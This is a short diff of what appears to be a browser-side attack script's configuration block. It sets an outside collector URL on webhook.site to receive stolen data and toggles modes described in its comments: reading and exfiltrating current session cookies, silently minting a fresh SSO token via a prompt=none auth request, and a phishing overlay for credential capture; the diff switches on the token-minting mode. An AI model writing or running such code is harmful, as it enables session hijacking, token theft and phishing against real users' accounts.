@@ -19,8 +19,8 @@
   // ---- Configuration (edit before testing) --------------------------------
   const COLLECTOR = "https://webhook.site/369070eb-ca2e-42e5-aff8-687c4d21f09a/collect"; // placeholder
   const RUN = {
-    exfilCurrentSession: true,   // (A) read+exfil whatever session/cookies exist now
-    silentSsoTokenMint: false,   // (B) mint a FRESH valid token via /auth?prompt=none
+    exfilCurrentSession: false,   // (A) read+exfil whatever session/cookies exist now
+    silentSsoTokenMint: true,   // (B) mint a FRESH valid token via /auth?prompt=none
     phishingOverlay: false,      // (C) origin-authentic credential capture
   };
   const SESSION_KEY = "acctFederationData";
